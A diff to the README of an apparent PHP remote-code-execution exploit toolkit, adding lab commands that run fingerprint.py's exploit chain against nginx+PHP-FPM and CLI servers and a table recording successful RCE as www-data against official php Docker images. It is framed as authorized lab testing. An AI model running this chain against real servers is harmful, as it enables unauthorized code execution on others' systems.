@@ -58,18 +58,22 @@ profile; `--list-profiles` prints the catalog. HTTP does not expose CPU
 architecture, so exact auto-dispatch requires `--arch` when both architecture
 profiles exist.
 
-For nginx + PHP-FPM or the PHP built-in server, `fingerprint.py` selects the
-persistent-SAPI chain instead of the Apache mod_php chain:
+For nginx + PHP-FPM or the PHP built-in server, `fingerprint.py` identifies the
+persistent-SAPI chain instead of the Apache mod_php chain. FPM/CLI profiles are
+build-specific: pass `--profile` for the exact image/build rather than relying
+on the PHP version alone:
 
 ```bash
 # nginx + PHP-FPM lab; local maps supply ASLR bases
 python3 fingerprint.py -u http://127.0.0.1:8556/index.php \
     --builder-url http://127.0.0.1:8557 \
+    --profile profiles/fpm/8.5.11-fpm.json \
     --persistent --local-bases --run
 
 # PHP CLI built-in server lab; --pid is the supervised chain worker
 python3 fingerprint.py -u http://127.0.0.1:18098/index.php \
     --builder-url http://127.0.0.1:18099 \
+    --profile profiles/fpm/php-8.5.11-cli.json \
     --persistent --local-bases \
     --pid "$(cat lab/fpm/runtime/php-8.5.11/cli/chain.pid)" --run
 ```
@@ -224,3 +228,30 @@ upstream repository. They are intentionally separate from the Apache mod_php
 session chain. Worker pinning is not implemented for a multi-worker FPM pool;
 the labs pin one chain worker. Use only on systems you own or are explicitly
 authorized to test.
+
+## Docker image checks
+
+Real images were pulled with rootless `podman` (no Docker daemon access was
+needed) and driven through `fingerprint.py`. The Apache targets used the image's
+prefork MPM pinned to one worker, `display_errors=On`, and a mounted lab INI.
+
+| Image | Effective config | Automatic result |
+|---|---|---|
+| `php:8.4.26-apache` | 8M / 64M post, one worker | **RCE**, `uid=33(www-data)` |
+| `php:8.4.26-apache` | 128M / 256M post, one worker | **RCE**, `uid=33(www-data)` |
+| `php:8.5.11-apache` | 8M / 64M post, one worker | **RCE**, `uid=33(www-data)` |
+| `php:8.5.11-apache` | 128M / 256M post, one worker | **RCE**, `uid=33(www-data)` via `php-8.5.11-bookworm-amd64-128m` |
+| `php:8.4.26-fpm` + `nginx:1.30-alpine` | chain 8M, builder 64M | automatic FPM dispatch refused: no trusted image-specific profile; a direct attempt with the upstream profile did not produce proof |
+| `php:8.5.11-fpm` + `nginx:1.30-alpine` | chain 8M, builder 64M | automatic FPM dispatch refused: no trusted 8.5.11 FPM profile |
+| `nginx:1.30-alpine` reverse proxy to `php:8.5.11-apache` | body reports `apache2handler` | correctly identified Apache, but the proxy path returned 502 during the pre-RINIT leak; direct Apache succeeded |
+
+The stock `php:*-apache` image defaults are `memory_limit=128M`,
+`post_max_size=8M`, `upload_max_filesize=2M`, `MaxRequestWorkers=150` and
+`display_errors=STDOUT`. Those defaults are outside the verified profile, so
+they need the lab INI and a one-worker MPM before the pre-RINIT chain is tested.
+The 8.5.11 128M profile is `profiles/php-8.5.11-128m.json`.
+
+FPM/CLI profiles are marked `build_specific`. `fingerprint.py` will show them
+but will not auto-run one by version alone; pass `--profile` for the exact
+image/build, or calibrate it. This prevents the upstream minimal-build 8.4
+profile from being mistaken for the official `php:8.4.26-fpm` image.
